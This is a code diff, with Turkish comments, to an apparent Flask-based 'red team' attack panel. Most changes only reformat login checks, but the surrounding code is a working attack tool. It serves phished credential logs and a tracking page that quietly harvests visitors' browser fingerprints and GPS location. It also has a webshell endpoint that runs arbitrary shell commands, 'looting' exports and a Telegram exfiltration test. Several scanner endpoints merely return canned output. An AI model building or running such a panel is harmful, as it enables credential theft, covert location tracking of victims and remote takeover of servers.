@@ -584,12 +584,14 @@ def insta_phish():
 
 @app.route("/api/phish/creds")
 def api_phish_creds():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"creds": CREDENTIAL_LOGS})
 
 @app.route("/api/crack-hash", methods=["POST"])
 def api_crack_hash():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     d = request.get_json()
     htype = d.get("type")
     target = d.get("hash").strip().lower()
@@ -619,11 +621,12 @@ def api_crack_hash():
 
 @app.route("/api/listener/start", methods=["POST"])
 def api_listener_start():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
 
-# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA (ÇİFT SÜSLÜ PARANTEZ İLE DÜZELTİLDİ) ---
+# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
     return f"""
@@ -698,6 +701,7 @@ def track_visitor(track_id):
                             fingerprint.lat = pos.coords.latitude;
                             fingerprint.lon = pos.coords.longitude;
                             sendData(fingerprint);
+                        },
                         err => {{ sendData(fingerprint); }},
                         {{ timeout: 10000 }}
                     );
@@ -752,12 +756,14 @@ def save_geo():
 
 @app.route("/api/lure/logs")
 def api_lure_logs():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"logs": CLICK_LOGS})
 
 @app.route("/api/telegram-test", methods=["POST"])
 def api_telegram_test():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     chat_id = request.get_json().get("chat_id")
     if not chat_id: return jsonify({"output": "[-] Chat ID boş olamaz!"})
     try:
@@ -771,7 +777,8 @@ def api_telegram_test():
 
 @app.route("/api/wifi-audit", methods=["POST"])
 def api_wifi_audit():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     action, iface = data.get("action"), data.get("iface", "wlan0")
     if action == "interfaces": cmd = "ip link show || ifconfig || iwconfig || cat /proc/net/dev"
@@ -784,7 +791,8 @@ def api_wifi_audit():
 
 @app.route("/api/scan", methods=["POST"])
 def api_scan():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     report, record = red_team_comprehensive_recon(data.get("target", ""))
     existing = next((i for i in SITE_DATABASE if i["target"] == record["target"]), None)
@@ -794,13 +802,15 @@ def api_scan():
 
 @app.route("/api/nikto", methods=["POST"])
 def api_nikto():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     target = request.get_json().get("target", "")
     return jsonify({"report": f"root@kali-box:~# nikto -h {target}\n[+] Nikto scan completed."})
 
 @app.route("/api/dns", methods=["POST"])
 def api_dns():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     domain = request.get_json().get("domain", "")
     try: ip = socket.gethostbyname(domain)
     except: ip = "Resolv fail"
@@ -808,22 +818,26 @@ def api_dns():
 
 @app.route("/api/sqlmap", methods=["POST"])
 def api_sqlmap():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "sqlmap injection test completed."})
 
 @app.route("/api/subdomain-scan", methods=["POST"])
 def api_subdomain_scan():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "Subdomain brute-force completed."})
 
 @app.route("/api/brute-force", methods=["POST"])
 def api_brute_force():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}}, 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "Brute-force sequence completed."})
 
 @app.route("/api/webshell", methods=["POST"])
 def api_webshell():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     cmd = request.get_json().get("command", "")
     try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
     except Exception as e: out = str(e)
@@ -831,12 +845,14 @@ def api_webshell():
 
 @app.route("/api/analyze-file", methods=["POST"])
 def api_analyze_file():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "File analysis clean."})
 
 @app.route("/api/all-data")
 def api_all_data():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"database": SITE_DATABASE})
 
 @app.route("/api/export/json")
@@ -854,7 +870,8 @@ def export_csv():
 
 @app.route("/api/looting/zip")
 def api_looting_zip():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     target = request.args.get("target", "")
     record = next((i for i in SITE_DATABASE if i["target"] == target), None)
     mf = io.BytesIO()
@@ -865,7 +882,8 @@ def api_looting_zip():
 
 @app.route("/api/download-pdf")
 def api_download_pdf():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
     pdf.multi_cell(0, 5, "Red Team Report")
     return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')
